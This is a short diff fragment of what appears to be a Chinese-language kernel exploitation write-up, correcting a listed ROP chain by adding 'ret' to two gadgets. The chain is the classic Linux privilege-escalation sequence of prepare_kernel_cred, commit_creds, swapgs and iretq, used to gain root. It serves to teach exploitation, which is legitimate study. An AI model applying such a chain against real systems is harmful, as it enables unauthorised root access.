@@ -344,9 +344,9 @@ ROP思路如下:<br>
 ```
 1. pop rdi, ret # rdi设置为0
 2. prepare_kernel_cred 
-3. mov rdi, rax 
+3. mov rdi, rax ; ret 
 4. commit_cred
-5. swapgs
+5. swapgs ; ret
 6. iretq
 rip # get root的函数
 cs
